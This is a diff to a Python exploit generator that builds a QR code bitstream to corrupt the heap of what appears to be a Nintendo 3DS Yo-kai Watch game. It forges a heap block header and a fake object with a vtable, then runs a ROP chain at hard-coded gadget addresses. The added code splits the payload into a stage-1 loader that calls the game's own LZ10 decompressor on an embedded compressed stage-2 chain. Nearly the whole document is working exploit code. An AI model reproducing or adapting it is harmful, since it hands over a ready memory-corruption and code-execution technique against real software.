@@ -12,14 +12,14 @@ from qrcode.constants import ERROR_CORRECT_L
 from qrcode.util import BitBuffer, create_bytes
 
 # QR result buffer and adjacent heap blocks.
-B = 0x32648924
+B = 0x326D4924
 P = B + 0x40
 N = B + 0x997B4
 H0 = B - 0x1C0628
-NEXT_BLOCK_ADDR = N + 0x480
 
-N_CAP = 0x00000458
+N_CAP = 0x00001058
 N_FLAGS = 0x04070000
+NEXT_BLOCK_ADDR = N + 0x28 + N_CAP
 
 
 # Layout-specific addresses and output names.
@@ -65,6 +65,7 @@ ADD18 = 0x0013B724  # ADD R0,R0,#0x18; BX LR
 POP_R1_PC = 0x003005EC  # POP {R1,PC}
 POP_R0_PC = 0x00112234  # POP {R0,PC}
 FREE_BLOCK_FUNC = 0x0013F9E4  # Insert/coalesce a free block.
+DECOMPRESS_FUNC = 0x0016734C  # sub_16734C(dst, &out_size, capacity, src); LZ10
 CREATE_YOKAI_FUNC = 0x003747E8  # Create a yokai; incoming R0 is unused.
 RET_LR = 0x0056FE20  # BX LR
 ADD_ITEM_FUNC = 0x003C7144  # Add an item (R0 = ID, R1 = quantity).
@@ -78,7 +79,11 @@ EXIT_R11 = 0x006B8B5C
 # Payload object layout.
 PREFIX_LEN = 0x1B
 OBJ_LEN = 0x1D0
-FIRST_SEGMENT_LEN = PREFIX_LEN + OBJ_LEN
+STAGE1_OBJ_LEN = 0x60
+STAGE1_BLOB_OFF = 0x60
+STAGE2_CAP = (OBJ_LEN + 3) & ~3
+DST = B + 0x400
+OUT_SIZE = B + 0x3FC
 
 INITIAL_STACK_OFF = 0x078
 EXIT_CTX_OFF = 0x120
@@ -97,13 +102,13 @@ def p32(buf, off, val):
     struct.pack_into("<I", buf, off, val)
 
 
-def build_fake_object(layout: Layout):
+def build_fake_object(layout: Layout, base: int):
     b = bytearray(OBJ_LEN)
-    object_addr = P
+    object_addr = base
     exit_r9_slot_addr = object_addr + EXIT_CTX_OFF + 0x24
 
-    # First-stage object. sub_12AB70 reads [P], then [P+0x40], and calls PIVOT.
-    # P+0x20..P+0x74 doubles as the fake vtable (base = P+0x20).
+    # Payload object. PIVOT loads R0-R12 from base, then SP/LR/PC.
+    # base+0x20..base+0x74 doubles as the fake vtable.
     # Slots not used by the chain must return safely (RET_LR = BX LR).
     p32(b, 0x00, object_addr + 0x20)
     p32(b, 0x14, 1)  # object data field, not used by the chain
@@ -111,7 +116,7 @@ def build_fake_object(layout: Layout):
         p32(b, off, RET_LR)
     p32(b, 0x34, object_addr + INITIAL_STACK_OFF)  # PIVOT: LR = new SP
     p32(b, 0x3C, POP_R0_TO_R3_R10_PC)  # PIVOT: PC after stack move
-    p32(b, 0x40, PIVOT)  # [P]+0x20 -> [P+0x40]
+    p32(b, 0x40, PIVOT)  # [base]+0x20 -> [base+0x40]
 
     # Initial register load; R0-R3/R10 are unused here; PC=POP_LR_PC.
     p32(b, INITIAL_STACK_OFF + 0x14, POP_LR_PC)
@@ -194,12 +199,106 @@ def build_fake_heap_header(layout: Layout):
     return b
 
 
-def build_first_segment(layout: Layout):
-    b = bytearray(FIRST_SEGMENT_LEN)
-    b[0:PREFIX_LEN] = b'\xEC' * PREFIX_LEN
-    blk = build_fake_object(layout)
-    b[PREFIX_LEN:PREFIX_LEN + len(blk)] = blk
+def lz10_compress(data):
+    # Greedy LZ10: 3..18-byte matches, 12-bit displacement.
+    out = bytearray()
+    flags = 0
+    flag_count = 0
+    tokens = bytearray()
+    i = 0
+    n = len(data)
+    while i < n:
+        best_len = 0
+        best_disp = 0
+        start = max(0, i - 4096)
+        for j in range(i - 1, start - 1, -1):
+            if data[j] != data[i]:
+                continue
+            length = 0
+            while (length < 18 and i + length < n
+                   and data[j + length] == data[i + length]):
+                length += 1
+            if length > best_len:
+                best_len = length
+                best_disp = i - j
+                if length == 18:
+                    break
+        if best_len >= 3:
+            flags |= 0x80 >> flag_count
+            disp = best_disp - 1
+            tokens.append(((best_len - 3) << 4) | (disp >> 8))
+            tokens.append(disp & 0xFF)
+            i += best_len
+        else:
+            tokens.append(data[i])
+            i += 1
+        flag_count += 1
+        if flag_count == 8:
+            out.append(flags)
+            out.extend(tokens)
+            flags = 0
+            flag_count = 0
+            tokens.clear()
+    if flag_count:
+        out.append(flags)
+        out.extend(tokens)
+    return bytes(out)
+
+
+def build_compressed_blob(stage2):
+    # Level-5 block header: (decompressed size << 3) | 1 (LZ10).
+    data = lz10_compress(stage2)
+    return struct.pack("<I", (len(stage2) << 3) | 1) + data
+
+
+def build_stage1(stack_addr):
+    b = bytearray(STAGE1_OBJ_LEN)
+    # Stage-1 loader. sub_12AB70 reads [P], then [P+0x40], and calls PIVOT.
+    p32(b, 0x00, P + 0x20)
+    p32(b, 0x14, 1)
+    for off in range(0x20, STAGE1_OBJ_LEN, 4):
+        p32(b, off, RET_LR)
+    p32(b, 0x34, stack_addr)
+    p32(b, 0x38, POP_R0_TO_R3_R10_PC)
+    p32(b, 0x3C, POP_R0_TO_R3_R10_PC)
+    p32(b, 0x40, PIVOT)
     return b
+
+
+def build_first_segment(layout: Layout):
+    stage2 = build_fake_object(layout, DST)
+    blob = build_compressed_blob(stage2)
+
+    stage1_off = PREFIX_LEN
+    blob_off = stage1_off + STAGE1_OBJ_LEN
+    blob_end = blob_off + len(blob)
+    # Leave the decompressor's 0x24-byte stack push below SP clear.
+    stack_off = blob_end + 0x24
+    while (B + 37 + stack_off) & 3:
+        stack_off += 1
+    stack_addr = B + 37 + stack_off
+
+    stage1 = build_stage1(stack_addr)
+    first = bytearray(stack_off + 0x30)
+    first[0:PREFIX_LEN] = b'\xEC' * PREFIX_LEN
+    first[stage1_off:stage1_off + len(stage1)] = stage1
+    first[blob_off:blob_off + len(blob)] = blob
+
+    # Stage-1 stack: decompressor frame, then the PIVOT frame into stage 2.
+    # R0=dst, R1=&out_size, R2=capacity, R3=src.
+    p32(first, stack_off + 0x00, DST)
+    p32(first, stack_off + 0x04, OUT_SIZE)
+    p32(first, stack_off + 0x08, STAGE2_CAP)
+    p32(first, stack_off + 0x0C, P + STAGE1_BLOB_OFF)
+    p32(first, stack_off + 0x10, 0)
+    p32(first, stack_off + 0x14, DECOMPRESS_FUNC)
+    p32(first, stack_off + 0x18, DST)
+    p32(first, stack_off + 0x1C, 0)
+    p32(first, stack_off + 0x20, 0)
+    p32(first, stack_off + 0x24, 0)
+    p32(first, stack_off + 0x28, 0)
+    p32(first, stack_off + 0x2C, PIVOT)
+    return first
 
 
 def build_declared_lengths(total):
@@ -212,21 +311,19 @@ def build_declared_lengths(total):
     return out
 
 
-DECLARED_LENGTHS = build_declared_lengths(N - (B + 37) - FIRST_SEGMENT_LEN)
-
-
 def build_bitstream(layout: Layout):
     bits = []
+    segment = build_first_segment(layout)
 
     def put(val, n):
         for i in range(n - 1, -1, -1):
             bits.append((val >> i) & 1)
 
     put(0b0100, 4)
-    put(FIRST_SEGMENT_LEN, 16)
-    for by in build_first_segment(layout):
+    put(len(segment), 16)
+    for by in segment:
         put(by, 8)
-    for count in DECLARED_LENGTHS:
+    for count in build_declared_lengths(N - (B + 37) - len(segment)):
         put(0b0011, 4)
         put(0, 4)
         put(0, 4)
